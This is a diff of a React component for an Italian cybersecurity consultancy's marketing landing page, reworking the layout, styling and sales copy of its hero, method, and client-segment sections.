-      { id: "stairs" as const, label: "03 // MATURITÀ DIFENSIVA: DAL TOOL ALL'UOMO", color: PALETTE.ink },
-    ],
-    []
-  );
 
   return (
     <div
@@ -2125,22 +2079,19 @@ export function LaraconCybersecSite() {
       }}
     >
       {/* =====================================================================
-       * SCHERMATA 1 — HERO ("THE THREATS HAVE" + "EVOLVED" come evento)
+       * 01 — HERO ("THE DIGITAL WORLD HAS EVOLVED.")
        * =================================================================== */}
       <section
-        aria-label="Hero: Evoluzione della minaccia"
-        onPointerMove={handleHeroPointerMove}
-        onPointerLeave={handleHeroPointerLeave}
+        id="hero"
+        aria-label="Il cambiamento digitale"
         style={{
-          minHeight: "92vh",
+          minHeight: "88vh",
           borderBottom: `1px solid ${PALETTE.slate}`,
           display: "grid",
           gridTemplateRows: "1fr",
-          padding: "clamp(20px, 4vw, 48px)",
-          gap: "24px",
+          padding: "clamp(28px, 5vw, 56px) clamp(20px, 4vw, 48px)",
         }}
       >
-        {/* Hero Stage: Tipografia monumentale allineata a sinistra */}
         <div
           style={{
             display: "flex",
@@ -2148,12 +2099,24 @@ export function LaraconCybersecSite() {
             justifyContent: "center",
             alignItems: "flex-start",
             textAlign: "left",
-            gap: "28px",
+            gap: "22px",
             maxWidth: "1280px",
             width: "100%",
             margin: "0 auto",
           }}
         >
+          <div
+            style={{
+              fontSize: "12px",
+              letterSpacing: "0.14em",
+              color: PALETTE.blue,
+              fontWeight: 700,
+              textTransform: "uppercase",
+            }}
+          >
+            01 // IL CAMBIAMENTO
+          </div>
+
           <HeroEvolveTitle
             replayKey={replayNonce}
             onReplay={() => setReplayNonce((n) => n + 1)}
@@ -2161,11 +2124,42 @@ export function LaraconCybersecSite() {
 
           <div
             style={{
+              maxWidth: "62ch",
+              display: "flex",
+              flexDirection: "column",
+              gap: "12px",
+              marginTop: "6px",
+            }}
+          >
+            <p
+              style={{
+                margin: 0,
+                fontSize: "clamp(1.05rem, 1.4vw, 1.2rem)",
+                lineHeight: 1.45,
+                fontWeight: 700,
+                color: "#F4F3FA",
+              }}
+            >
+              La tua azienda è rimasta al passo?
+            </p>
+            <p style={{ margin: 0, fontSize: "14px", lineHeight: 1.65, color: PALETTE.ink }}>
+              Il mondo digitale cambia continuamente. Nuove tecnologie, nuove minacce e nuove responsabilità per chi fa impresa.
+            </p>
+            <p style={{ margin: 0, fontSize: "14px", lineHeight: 1.65, color: "#B0AEB2" }}>
+              Ma mentre tutto evolve, molte aziende continuano ad affidarsi a sistemi, strumenti e abitudini che non vengono verificati da tempo.
+            </p>
+            <p style={{ margin: 0, fontSize: "14px", lineHeight: 1.65, color: "#B0AEB2" }}>
+              Il rischio non è soltanto rimanere indietro. È esporsi, spesso senza saperlo, a intrusioni informatiche, interruzioni operative e possibili conseguenze normative.
+            </p>
+          </div>
+
+          <div
+            style={{
               display: "flex",
               flexWrap: "wrap",
               justifyContent: "flex-start",
               gap: "12px",
-              marginTop: "4px",
+              marginTop: "6px",
             }}
           >
             <Link
@@ -2182,7 +2176,7 @@ export function LaraconCybersecSite() {
                 borderRadius: 0,
               }}
             >
-              DISCUTIAMO IL TUO PERIMETRO →
+              Parliamo della tua azienda →
             </Link>
             <a
               href="#go-deeper"
@@ -2200,18 +2194,18 @@ export function LaraconCybersecSite() {
                 alignItems: "center",
               }}
             >
-              ESPLORA IL METODO ↓
+              Scopri cosa è cambiato ↓
             </a>
           </div>
         </div>
       </section>
 
       {/* =====================================================================
-       * SCHERMATA 2 — LO SPARTIACQUE ("IN 2026 WE| -> GO DEEPER")
+       * 02 — GO DEEPER ("FUNZIONA. MA È DAVVERO SICURO?")
        * =================================================================== */}
       <section
         id="go-deeper"
-        aria-label="Go Deeper: Scanner automatico vs Pentest manuale"
+        aria-label="La consapevolezza: funziona ma è sicuro?"
         style={{
           minHeight: "88vh",
           borderBottom: `1px solid ${PALETTE.slate}`,
@@ -2219,7 +2213,6 @@ export function LaraconCybersecSite() {
           display: "flex",
           flexDirection: "column",
           justifyContent: "center",
-          gap: "40px",
         }}
       >
         <div
@@ -2243,7 +2236,7 @@ export function LaraconCybersecSite() {
               display: "flex",
               alignItems: "center",
               justifyContent: "center",
-              opacity: 0.72,
+              opacity: 0.58,
             }}
           >
             <PixelDitherCanvas
@@ -2256,52 +2249,106 @@ export function LaraconCybersecSite() {
             />
           </div>
 
-          <div style={{ position: "relative", zIndex: 2, textAlign: "center" }}>
-            <div style={{ fontSize: "13px", letterSpacing: "0.14em", marginBottom: "14px", color: PALETTE.ink }}>
-              <TypewriterBar text="IN 2026 WE" cursorColor={PALETTE.red} speedMs={75} />
+          <div
+            style={{
+              position: "relative",
+              zIndex: 2,
+              display: "flex",
+              flexDirection: "column",
+              alignItems: "center",
+              textAlign: "center",
+            }}
+          >
+            <div style={{ fontSize: "13px", letterSpacing: "0.14em", marginBottom: "16px", color: "#F4F3FA" }}>
+              <TypewriterBar text="02 // LA CONSAPEVOLEZZA" cursorColor={PALETTE.red} speedMs={55} />
             </div>
+
             <h2
               style={{
                 margin: 0,
                 fontFamily: DISPLAY_FONT,
                 fontWeight: 700,
-                fontSize: "clamp(4rem, 12vw, 9.5rem)",
-                lineHeight: 0.85,
-                letterSpacing: "-0.03em",
+                fontSize: "clamp(3rem, 8.2vw, 6.6rem)",
+                lineHeight: 0.9,
+                letterSpacing: "-0.025em",
                 textTransform: "uppercase",
                 color: PALETTE.ink,
               }}
             >
-              GO DEEPER
+              FUNZIONA.
+              <br />
+              <span style={{ color: "#F4F3FA" }}>MA È DAVVERO SICURO?</span>
             </h2>
-            <p
+
+            <div
               style={{
-                margin: "20px auto 0 auto",
-                maxWidth: "56ch",
-                fontSize: "13px",
-                lineHeight: 1.6,
-                color: PALETTE.ink,
-                background: "rgba(1, 1, 1, 0.82)",
-                padding: "10px 14px",
+                margin: "32px auto 0 auto",
+                maxWidth: "66ch",
+                width: "100%",
+                textAlign: "left",
+                background: "rgba(1, 1, 1, 0.9)",
+                padding: "clamp(20px, 3vw, 32px)",
                 border: "1px solid #262428",
+                display: "flex",
+                flexDirection: "column",
+                gap: "14px",
               }}
             >
-              Uno scanner automatico vede solo i mattoni esterni. Un penetration test manuale attraversa
-              il flusso di autenticazione, le race condition e i controlli di ruolo reali.
-            </p>
+              <p style={{ margin: 0, fontSize: "14px", lineHeight: 1.65, color: PALETTE.ink }}>
+                Il gestionale si apre. Le email arrivano. Il sito è online. Tutto sembra funzionare.
+              </p>
+              <p style={{ margin: 0, fontSize: "15px", lineHeight: 1.55, fontWeight: 700, color: "#F4F3FA" }}>
+                Ma funzionare non significa essere al sicuro.
+              </p>
+              <p style={{ margin: 0, fontSize: "14px", lineHeight: 1.65, color: "#B8B6BA" }}>
+                Un software non aggiornato, un accesso dimenticato o una configurazione sbagliata possono lasciare aperta una porta che nessuno sta controllando.
+              </p>
+              <p style={{ margin: 0, fontSize: "14px", lineHeight: 1.65, color: "#B8B6BA" }}>
+                E non sono soltanto le minacce a cambiare. Anche le normative impongono, alle imprese a cui si applicano, responsabilità e misure di sicurezza che non possono essere ignorate.
+              </p>
+              <p style={{ margin: 0, fontSize: "14px", lineHeight: 1.65, color: "#B8B6BA" }}>
+                Il problema è che molte vulnerabilità non si vedono durante il normale lavoro quotidiano.
+              </p>
+              <p
+                style={{
+                  margin: "4px 0 0 0",
+                  fontSize: "15px",
+                  lineHeight: 1.55,
+                  fontWeight: 700,
+                  color: "#F4F3FA",
+                  borderLeft: `3px solid ${PALETTE.red}`,
+                  paddingLeft: "14px",
+                }}
+              >
+                Ed è proprio ciò che non vedi che merita di essere verificato.
+              </p>
+              <p
+                style={{
+                  margin: "8px 0 0 0",
+                  paddingTop: "14px",
+                  borderTop: "1px solid #262428",
+                  fontSize: "13.5px",
+                  lineHeight: 1.6,
+                  fontStyle: "italic",
+                  color: PALETTE.ink,
+                }}
+              >
+                Prima di decidere cosa cambiare, bisogna sapere dove guardare.
+              </p>
+            </div>
           </div>
         </div>
       </section>
 
       {/* =====================================================================
-       * SCHERMATA 3 — LA TRILOGIA DEL METODO ([DE]CONSTRUCT / [EX]PLOIT / [RE]MEDIATE)
-       * Card grandi in sticky stacking che si sovrappongono allo scroll
+       * 03 — IL METODO ("NON PUOI PROTEGGERE CIÒ CHE NON CONOSCI.")
        * =================================================================== */}
       <section
-        aria-label="Trilogia del metodo offensivo e difensivo"
+        id="metodo"
+        aria-label="Il metodo: Deconstruct, Exploit, Remediate"
         style={{
           borderBottom: `1px solid ${PALETTE.slate}`,
-          padding: "clamp(64px, 9vw, 120px) clamp(20px, 4vw, 48px)",
+          padding: "clamp(64px, 8vw, 112px) clamp(20px, 4vw, 48px)",
         }}
       >
         <div
@@ -2311,97 +2358,321 @@ export function LaraconCybersecSite() {
             margin: "0 auto",
             display: "flex",
             flexDirection: "column",
-            gap: "22vh",
-            paddingBottom: "10vh",
+            gap: "clamp(36px, 5vw, 56px)",
           }}
         >
-          {RE_PILLARS.map((item, idx) => (
-            <div
-              key={item.verb}
-              ref={idx === 0 ? pillar0Ref : idx === 1 ? pillar1Ref : undefined}
+          {/* Intestazione Sezione 03 */}
+          <div style={{ display: "flex", flexDirection: "column", gap: "16px", maxWidth: "68ch" }}>
+            <div style={{ fontSize: "12px", color: PALETTE.red, letterSpacing: "0.14em", fontWeight: 700 }}>
+              03 // DALL&apos;INCERTEZZA ALLA CONSAPEVOLEZZA
+            </div>
+            <h2
               style={{
-                position: "sticky",
-                top: `${72 + idx * 24}px`,
-                zIndex: idx + 1,
-                minHeight: "min(74vh, 580px)",
-                background: "#050507",
-                border: "1px solid #262428",
-                borderTop: `3px solid ${item.color}`,
-                boxShadow: idx > 0 ? "0 -28px 60px rgba(0, 0, 0, 0.9)" : "none",
-                padding: "clamp(32px, 5vw, 64px)",
-                display: "grid",
-                gridTemplateColumns: "repeat(auto-fit, minmax(260px, 1fr))",
-                alignItems: "center",
-                gap: "32px",
+                margin: 0,
+                fontFamily: DISPLAY_FONT,
+                fontWeight: 700,
+                fontSize: "clamp(2.8rem, 6.2vw, 5.4rem)",
+                lineHeight: 0.92,
+                letterSpacing: "-0.025em",
+                textTransform: "uppercase",
+                color: PALETTE.ink,
               }}
             >
-              {/* Colonna SX: [PREFISSO] + VERBO gigante */}
-              <div>
-                <div
-                  style={{
-                    fontSize: "12px",
-                    color: PALETTE.dim,
-                    marginBottom: "14px",
-                    letterSpacing: "0.12em",
-                  }}
-                >
-                  FASE 0{idx + 1}
-                </div>
-                <div style={{ display: "inline-flex", alignItems: "center", gap: "0.14em" }}>
-                  <PixelDissolveBadge
-                    text={item.prefix}
-                    bg={item.color}
-                    fg={PALETTE.bg}
-                    fontSize="clamp(3.6rem, 7.2vw, 6.4rem)"
-                    padding="0.06em 0.18em"
-                  />
-                  <span
+              NON PUOI PROTEGGERE
+              <br />
+              CIÒ CHE NON CONOSCI.
+            </h2>
+            <p style={{ margin: 0, fontSize: "14px", lineHeight: 1.65, color: "#B8B6BA" }}>
+              Non servono necessariamente più strumenti. Serve prima comprendere se quelli che utilizzi sono adeguati e dove potrebbero nascondersi i problemi.
+            </p>
+          </div>
+
+          {/* 3 Card grandi in sticky stacking */}
+          <div
+            style={{
+              display: "flex",
+              flexDirection: "column",
+              gap: "18vh",
+              paddingBottom: "6vh",
+            }}
+          >
+            {RE_PILLARS.map((item, idx) => (
+              <div
+                key={item.verb}
+                ref={idx === 0 ? pillar0Ref : idx === 1 ? pillar1Ref : undefined}
+                style={{
+                  position: "sticky",
+                  top: `${72 + idx * 24}px`,
+                  zIndex: idx + 1,
+                  minHeight: "min(72vh, 560px)",
+                  background: "#050507",
+                  border: "1px solid #262428",
+                  borderTop: `3px solid ${item.color}`,
+                  boxShadow: idx > 0 ? "0 -28px 60px rgba(0, 0, 0, 0.9)" : "none",
+                  padding: "clamp(28px, 4.5vw, 56px)",
+                  display: "grid",
+                  gridTemplateColumns: "repeat(auto-fit, minmax(280px, 1fr))",
+                  alignItems: "center",
+                  gap: "32px",
+                }}
+              >
+                {/* Colonna SX: Fase + Verbo + Spiegazione chiara */}
+                <div style={{ display: "flex", flexDirection: "column", gap: "16px" }}>
+                  <div
                     style={{
-                      fontFamily: DISPLAY_FONT,
-                      fontWeight: 700,
-                      fontSize: "clamp(3.6rem, 7.2vw, 6.4rem)",
-                      lineHeight: 0.92,
-                      letterSpacing: "-0.02em",
-                      color: PALETTE.ink,
-                      textTransform: "uppercase",
+                      fontSize: "12px",
+                      color: PALETTE.dim,
+                      letterSpacing: "0.12em",
                     }}
                   >
-                    {item.verb}
-                  </span>
+                    FASE 0{idx + 1}
+                  </div>
+                  <div style={{ display: "inline-flex", alignItems: "center", gap: "0.14em", flexWrap: "wrap" }}>
+                    <PixelDissolveBadge
+                      text={item.prefix}
+                      bg={item.color}
+                      fg={PALETTE.bg}
+                      fontSize="clamp(2.8rem, 5.2vw, 4.8rem)"
+                      padding="0.06em 0.18em"
+                    />
+                    <span
+                      style={{
+                        fontFamily: DISPLAY_FONT,
+                        fontWeight: 700,
+                        fontSize: "clamp(2.8rem, 5.2vw, 4.8rem)",
+                        lineHeight: 0.92,
+                        letterSpacing: "-0.02em",
+                        color: PALETTE.ink,
+                        textTransform: "uppercase",
+                      }}
+                    >
+                      {item.verb}
+                    </span>
+                  </div>
+                  <h3
+                    style={{
+                      margin: "6px 0 0 0",
+                      fontSize: "clamp(1.05rem, 1.45vw, 1.25rem)",
+                      lineHeight: 1.4,
+                      fontWeight: 700,
+                      color: "#F4F3FA",
+                    }}
+                  >
+                    {item.title}
+                  </h3>
+                  <div style={{ display: "flex", flexDirection: "column", gap: "10px", maxWidth: "48ch" }}>
+                    {item.body.map((paragraph) => (
+                      <p
+                        key={paragraph}
+                        style={{ margin: 0, fontSize: "14px", lineHeight: 1.65, color: "#B8B6BA" }}
+                      >
+                        {paragraph}
+                      </p>
+                    ))}
+                  </div>
+                </div>
+
+                {/* Colonna DX: Solido 3D */}
+                <div style={{ display: "flex", justifyContent: "center" }}>
+                  <PixelDitherCanvas
+                    kind={item.scene}
+                    color={item.color}
+                    width={380}
+                    height={270}
+                    cellSize={5}
+                    explode={idx === 0 && cubeExploded ? 1 : idx === 1 && exploitActive ? 1 : 0}
+                    style={{ width: "100%", maxWidth: "380px", height: "auto" }}
+                  />
                 </div>
               </div>
+            ))}
+          </div>
 
-              {/* Colonna DX: Solido 3D */}
-              <div style={{ display: "flex", justifyContent: "center" }}>
-                <PixelDitherCanvas
-                  kind={item.scene}
-                  color={item.color}
-                  width={380}
-                  height={270}
-                  cellSize={5}
-                  explode={idx === 0 && cubeExploded ? 1 : idx === 1 && exploitActive ? 1 : 0}
-                  style={{ width: "100%", maxWidth: "380px", height: "auto" }}
-                />
-              </div>
-            </div>
-          ))}
+          <p
+            style={{
+              margin: 0,
+              paddingTop: "16px",
+              borderTop: `1px solid ${PALETTE.slate}`,
+              fontSize: "14px",
+              lineHeight: 1.6,
+              fontStyle: "italic",
+              color: PALETTE.ink,
+            }}
+          >
+            La consapevolezza, da sola, non basta. Deve portare a una decisione.
+          </p>
         </div>
       </section>
 
       {/* =====================================================================
-       * SCHERMATA 4 — TARGET D'ACQUISTO ([REAL] SYSTEMS — PMI, Startup, Multi)
+       * 04 — LE TRE RISPOSTE AL CAMBIAMENTO (RETOOL / ADAPT / EVOLVE)
        * =================================================================== */}
       <section
-        aria-label="Selettore per chi compra: PMI, Startup e Multinazionali"
+        id="risposte"
+        aria-label="Le tre risposte al cambiamento: Retool, Adapt, Evolve"
+        style={{ borderBottom: `1px solid ${PALETTE.slate}` }}
+      >
+        {/* Intestazione Sezione 04 */}
+        <div
+          style={{
+            padding: "clamp(56px, 7vw, 96px) clamp(20px, 4vw, 48px) clamp(40px, 5vw, 64px)",
+            borderBottom: `2px solid ${PALETTE.bg}`,
+          }}
+        >
+          <div style={{ maxWidth: "1280px", margin: "0 auto", display: "flex", flexDirection: "column", gap: "16px" }}>
+            <div style={{ fontSize: "12px", color: PALETTE.blue, letterSpacing: "0.14em", fontWeight: 700 }}>
+              04 // LE TRE RISPOSTE AL CAMBIAMENTO
+            </div>
+            <h2
+              style={{
+                margin: 0,
+                fontFamily: DISPLAY_FONT,
+                fontWeight: 700,
+                fontSize: "clamp(2.8rem, 6.2vw, 5.4rem)",
+                lineHeight: 0.92,
+                letterSpacing: "-0.025em",
+                textTransform: "uppercase",
+                color: PALETTE.ink,
+              }}
+            >
+              IL MONDO CAMBIA.
+              <br />
+              RESTARE FERMI È UNA SCELTA.
+            </h2>
+            <div style={{ maxWidth: "64ch", display: "flex", flexDirection: "column", gap: "10px", marginTop: "4px" }}>
+              <p style={{ margin: 0, fontSize: "14px", lineHeight: 1.65, color: "#B8B6BA" }}>
+                Non significa inseguire ogni novità o sostituire continuamente ciò che già funziona.
+              </p>
+              <p style={{ margin: 0, fontSize: "14px", lineHeight: 1.65, color: PALETTE.ink }}>
+                Significa capire quando una tecnologia, un&apos;abitudine o una misura di protezione non è più adeguata.
+              </p>
+            </div>
+          </div>
+        </div>
+
+        {/* 3 Bande Widescreen con la stessa struttura 3D in sequenza (frammentata -> in modifica -> coesa) */}
+        {DIFF_BANDS.map((band) => (
+          <div
+            key={band.word}
+            style={{
+              background: band.bg,
+              color: band.fg,
+              borderBottom: `2px solid ${PALETTE.bg}`,
+              padding: "clamp(40px, 6vw, 76px) clamp(20px, 4vw, 48px)",
+            }}
+          >
+            <div
+              style={{
+                maxWidth: "1280px",
+                margin: "0 auto",
+                display: "grid",
+                gridTemplateColumns: "repeat(auto-fit, minmax(300px, 1fr))",
+                alignItems: "center",
+                gap: "36px",
+              }}
+            >
+              {/* Parte SX: La stessa struttura digitale che evolve attraverso i 3 stati */}
+              <div
+                style={{
+                  position: "relative",
+                  display: "flex",
+                  alignItems: "center",
+                  justifyContent: "center",
+                  minHeight: "260px",
+                }}
+              >
+                <PixelDitherCanvas
+                  kind={band.scene}
+                  color={PALETTE.bg}
+                  width={420}
+                  height={280}
+                  cellSize={5}
+                  style={{ width: "100%", maxWidth: "420px", height: "auto" }}
+                />
+                <div style={{ position: "absolute", left: "8%", top: "50%", transform: "translateY(-50%)" }}>
+                  <PixelDissolveBadge
+                    text={band.word}
+                    bg={band.badgeBg}
+                    fg={band.badgeFg}
+                    fontSize="clamp(2.4rem, 5vw, 4.2rem)"
+                    padding="0.1em 0.28em"
+                  />
+                </div>
+              </div>
+
+              {/* Parte DX: Risposta strategica */}
+              <div style={{ display: "flex", flexDirection: "column", gap: "14px" }}>
+                <div style={{ fontSize: "11px", fontWeight: 700, letterSpacing: "0.1em", opacity: 0.88 }}>
+                  {band.step}
+                </div>
+                <h3
+                  style={{
+                    margin: 0,
+                    fontFamily: DISPLAY_FONT,
+                    fontSize: "clamp(1.9rem, 3.3vw, 2.7rem)",
+                    lineHeight: 0.98,
+                    textTransform: "uppercase",
+                  }}
+                >
+                  {band.title}
+                </h3>
+                <div style={{ display: "flex", flexDirection: "column", gap: "10px" }}>
+                  {band.body.map((paragraph) => (
+                    <p key={paragraph} style={{ margin: 0, fontSize: "14px", lineHeight: 1.65 }}>
+                      {paragraph}
+                    </p>
+                  ))}
+                </div>
+                <div
+                  style={{
+                    marginTop: "6px",
+                    padding: "14px 16px",
+                    background: PALETTE.bg,
+                    color: PALETTE.ink,
+                    fontSize: "13.5px",
+                    lineHeight: 1.6,
+                    fontWeight: 700,
+                  }}
+                >
+                  {band.statement}
+                </div>
+              </div>
+            </div>
+          </div>
+        ))}
+
+        {/* Chiusura Sezione 04 */}
+        <div style={{ padding: "28px clamp(20px, 4vw, 48px)", background: PALETTE.bg }}>
+          <p
+            style={{
+              maxWidth: "1280px",
+              margin: "0 auto",
+              fontSize: "14px",
+              lineHeight: 1.6,
+              fontStyle: "italic",
+              color: PALETTE.ink,
+            }}
+          >
+            Ogni azienda parte da una situazione diversa. Ed è da quella situazione che bisogna cominciare.
+          </p>
+        </div>
+      </section>
+
+      {/* =====================================================================
+       * 05 — A CHI MI RIVOLGO (PMI / Startup / Multinazionali)
+       * =================================================================== */}
+      <section
+        id="a-chi-mi-rivolgo"
+        aria-label="A chi mi rivolgo: Imprenditori e PMI, Startup e software house, Multinazionali"
         style={{
           position: "relative",
-          minHeight: "90vh",
+          minHeight: "88vh",
           borderBottom: `1px solid ${PALETTE.slate}`,
-          padding: "clamp(48px, 7vw, 96px) clamp(20px, 4vw, 48px)",
+          padding: "clamp(56px, 7vw, 96px) clamp(20px, 4vw, 48px)",
           overflow: "hidden",
         }}
       >
-        {/* Cupola antracite in dither sullo sfondo come 0:44–0:47 */}
+        {/* Cupola antracite in dither sullo sfondo */}
         <div
           aria-hidden="true"
           style={{
@@ -2411,285 +2682,216 @@ export function LaraconCybersecSite() {
             transform: "translateX(-50%)",
             width: "min(900px, 100%)",
             pointerEvents: "none",
-            opacity: 0.9,
+            opacity: 0.85,
           }}
         >
-          <PixelDitherCanvas kind="dome" color={PALETTE.slate} width={760} height={360} cellSize={6} interactive={false} style={{ width: "100%", height: "auto" }} />
+          <PixelDitherCanvas
+            kind="dome"
+            color={PALETTE.slate}
+            width={760}
+            height={360}
+            cellSize={6}
+            interactive={false}
+            style={{ width: "100%", height: "auto" }}
+          />
         </div>
 
-        <div style={{ position: "relative", zIndex: 2, maxWidth: "1280px", margin: "0 auto", display: "flex", flexDirection: "column", gap: "28px" }}>
-          <div style={{ textAlign: "center" }}>
-            <div style={{ fontSize: "11px", color: PALETTE.dim, letterSpacing: "0.14em", marginBottom: "14px" }}>
-              CHI COMPRA CYBERSECURITY · SELEZIONA IL TUO CONTESTO
+        <div
+          style={{
+            position: "relative",
+            zIndex: 2,
+            maxWidth: "1280px",
+            margin: "0 auto",
+            display: "flex",
+            flexDirection: "column",
+            gap: "32px",
+          }}
+        >
+          <div style={{ textAlign: "center", display: "flex", flexDirection: "column", gap: "14px", alignItems: "center" }}>
+            <div style={{ fontSize: "12px", color: PALETTE.dim, letterSpacing: "0.14em", fontWeight: 700 }}>
+              05 // TRE REALTÀ, RESPONSABILITÀ DIVERSE
             </div>
             <h2
               style={{
                 margin: 0,
-                display: "inline-flex",
-                alignItems: "center",
-                justifyContent: "center",
-                gap: "0.18em",
-                flexWrap: "wrap",
                 fontFamily: DISPLAY_FONT,
-                fontSize: "clamp(2.8rem, 6vw, 5.2rem)",
-                lineHeight: 0.9,
-                letterSpacing: "-0.02em",
+                fontWeight: 700,
+                fontSize: "clamp(2.6rem, 6vw, 5.2rem)",
+                lineHeight: 0.92,
+                letterSpacing: "-0.025em",
                 textTransform: "uppercase",
+                color: PALETTE.ink,
               }}
             >
-              <PixelDissolveBadge
-                text="REAL"
-                bg={PALETTE.ink}
-                fg={PALETTE.bg}
-                triggerKey={activeBuyer}
-                fontSize="clamp(2.8rem, 6vw, 5.2rem)"
-              />
-              <PixelDissolveBadge
-                text={buyer.badgeWord}
-                bg="transparent"
-                fg={buyer.badgeColor}
-                triggerKey={activeBuyer}
-                fontSize="clamp(2.8rem, 6vw, 5.2rem)"
-                padding="0"
-              />
+              IL RISCHIO NON GUARDA
+              <br />
+              LE DIMENSIONI DELLA TUA AZIENDA.
             </h2>
           </div>
 
-          {/* 3 Tab di Target d'Acquisto */}
+          {/* 3 Card situazionali selezionabili: ciascuna mostra subito una situazione riconoscibile */}
           <div
+            role="tablist"
+            aria-label="Seleziona il tipo di realtà aziendale"
             style={{
               display: "grid",
-              gridTemplateColumns: "repeat(auto-fit, minmax(220px, 1fr))",
-              gap: "8px",
+              gridTemplateColumns: "repeat(auto-fit, minmax(260px, 1fr))",
+              gap: "10px",
             }}
           >
             {(Object.keys(BUYER_SEGMENTS) as BuyerSegmentKey[]).map((key) => {
               const seg = BUYER_SEGMENTS[key];
               const isSelected = activeBuyer === key;
+              const selectedInk = seg.badgeColor === PALETTE.ink ? PALETTE.bg : "#ffffff";
               return (
                 <button
                   key={key}
                   type="button"
+                  role="tab"
+                  aria-selected={isSelected}
                   onClick={() => setActiveBuyer(key)}
                   style={{
-                    padding: "16px",
+                    padding: "20px",
                     textAlign: "left",
                     background: isSelected ? seg.badgeColor : "#08080a",
-                    color: isSelected ? (seg.badgeColor === PALETTE.ink ? PALETTE.bg : "#ffffff") : PALETTE.ink,
+                    color: isSelected ? selectedInk : PALETTE.ink,
                     border: `1px solid ${isSelected ? seg.badgeColor : "#2b292e"}`,
                     borderRadius: 0,
                     cursor: "pointer",
                     fontFamily: MONO_FONT,
+                    display: "flex",
+                    flexDirection: "column",
+                    justifyContent: "space-between",
+                    gap: "12px",
                   }}
                 >
-                  <div style={{ fontSize: "11px", opacity: 0.85, marginBottom: "6px" }}>{seg.code}</div>
-                  <div style={{ fontFamily: DISPLAY_FONT, fontSize: "1.45rem", textTransform: "uppercase", lineHeight: 1.05 }}>
-                    {seg.label}
+                  <div>
+                    <div style={{ fontSize: "11px", opacity: 0.8, marginBottom: "8px", letterSpacing: "0.08em" }}>
+                      {seg.code}
+                    </div>
+                    <div
+                      style={{
+                        fontFamily: DISPLAY_FONT,
+                        fontSize: "1.55rem",
+                        textTransform: "uppercase",
+                        lineHeight: 1.05,
+                        marginBottom: "10px",
+                      }}
+                    >
+                      {seg.label}
+                    </div>
+                    <p
+                      style={{
+                        margin: 0,
+                        fontSize: "13px",
+                        lineHeight: 1.5,
+                        opacity: isSelected ? 0.96 : 0.78,
+                      }}
+                    >
+                      {seg.headline}
+                    </p>
+                  </div>
+                  <div style={{ fontSize: "11px", letterSpacing: "0.08em", textTransform: "uppercase", opacity: 0.85 }}>
+                    {isSelected ? "● SELEZIONATO" : "APRI APPROFONDIMENTO →"}
                   </div>
                 </button>
               );
             })}
           </div>
 
-          {/* Dettaglio di Conversione per il Target Scelto */}
+          {/* Approfondimento completo per la realtà selezionata */}
           <div
+            role="tabpanel"
             style={{
               border: `1px solid ${buyer.badgeColor}`,
-              background: "rgba(1, 1, 1, 0.92)",
-              padding: "clamp(20px, 4vw, 36px)",
-              display: "grid",
-              gap: "24px",
+              background: "rgba(1, 1, 1, 0.94)",
+              padding: "clamp(24px, 4vw, 40px)",
+              display: "flex",
+              flexDirection: "column",
+              gap: "20px",
             }}
           >
-            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "baseline", flexWrap: "wrap", gap: "12px", borderBottom: "1px solid #262428", paddingBottom: "16px" }}>
-              <h3 style={{ margin: 0, fontFamily: DISPLAY_FONT, fontSize: "clamp(1.8rem, 3.4vw, 2.8rem)", textTransform: "uppercase", color: PALETTE.ink }}>
+            <div style={{ borderBottom: "1px solid #262428", paddingBottom: "16px" }}>
+              <div
+                style={{
+                  fontSize: "11px",
+                  color: buyer.badgeColor,
+                  letterSpacing: "0.1em",
+                  textTransform: "uppercase",
+                  marginBottom: "8px",
+                  fontWeight: 700,
+                }}
+              >
+                {buyer.code} {"//"} {buyer.label}
+              </div>
+              <h3
+                style={{
+                  margin: 0,
+                  fontFamily: DISPLAY_FONT,
+                  fontSize: "clamp(1.7rem, 3.2vw, 2.5rem)",
+                  lineHeight: 1.05,
+                  textTransform: "uppercase",
+                  color: "#F4F3FA",
+                }}
+              >
                 {buyer.headline}
               </h3>
-              <span style={{ fontSize: "11px", color: buyer.badgeColor, letterSpacing: "0.06em" }}>
-                {buyer.sla}
-              </span>
             </div>
 
-            <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(230px, 1fr))", gap: "20px" }}>
-              <div>
-                <div style={{ fontSize: "11px", color: PALETTE.dim, marginBottom: "6px" }}>[01 // COSA TI BLOCCA OGGI]</div>
-                <p style={{ margin: 0, fontSize: "13px", lineHeight: 1.6, color: PALETTE.ink }}>{buyer.pain}</p>
-              </div>
-              <div>
-                <div style={{ fontSize: "11px", color: PALETTE.dim, marginBottom: "6px" }}>[02 // PERCHÉ I CLIENTI COMPRANO]</div>
-                <p style={{ margin: 0, fontSize: "13px", lineHeight: 1.6, color: PALETTE.ink }}>{buyer.trigger}</p>
-              </div>
-              <div>
-                <div style={{ fontSize: "11px", color: PALETTE.dim, marginBottom: "6px" }}>[03 // VETTORE REALE TESTATO]</div>
-                <p style={{ margin: 0, fontSize: "13px", lineHeight: 1.6, color: PALETTE.ink }}>{buyer.vector}</p>
-              </div>
-              <div>
-                <div style={{ fontSize: "11px", color: PALETTE.dim, marginBottom: "6px" }}>[04 // COSA RICEVI IN MANO]</div>
-                <p style={{ margin: 0, fontSize: "13px", lineHeight: 1.6, color: PALETTE.ink }}>{buyer.deliverable}</p>
-              </div>
-            </div>
-
-            <div style={{ display: "flex", flexWrap: "wrap", gap: "8px", paddingTop: "8px" }}>
-              {buyer.pillars.map((pill) => (
-                <span
-                  key={pill}
-                  style={{
-                    padding: "6px 10px",
-                    border: "1px solid #38353b",
-                    fontSize: "11px",
-                    color: PALETTE.ink,
-                    textTransform: "uppercase",
-                  }}
-                >
-                  {pill}
-                </span>
+            <div style={{ display: "flex", flexDirection: "column", gap: "12px", maxWidth: "68ch" }}>
+              {buyer.intro.map((paragraph) => (
+                <p key={paragraph} style={{ margin: 0, fontSize: "14px", lineHeight: 1.68, color: PALETTE.ink }}>
+                  {paragraph}
+                </p>
               ))}
+              <p
+                style={{
+                  margin: "6px 0",
+                  paddingLeft: "16px",
+                  borderLeft: `3px solid ${buyer.badgeColor}`,
+                  fontSize: "15px",
+                  lineHeight: 1.6,
+                  fontWeight: 700,
+                  color: "#F4F3FA",
+                }}
+              >
+                {buyer.statement}
+              </p>
+              <p style={{ margin: 0, fontSize: "14px", lineHeight: 1.68, color: "#B8B6BA" }}>
+                {buyer.approach}
+              </p>
+            </div>
+
+            <div style={{ paddingTop: "8px" }}>
+              <Link
+                href="/prenota"
+                style={{
+                  display: "inline-flex",
+                  alignItems: "center",
+                  padding: "14px 24px",
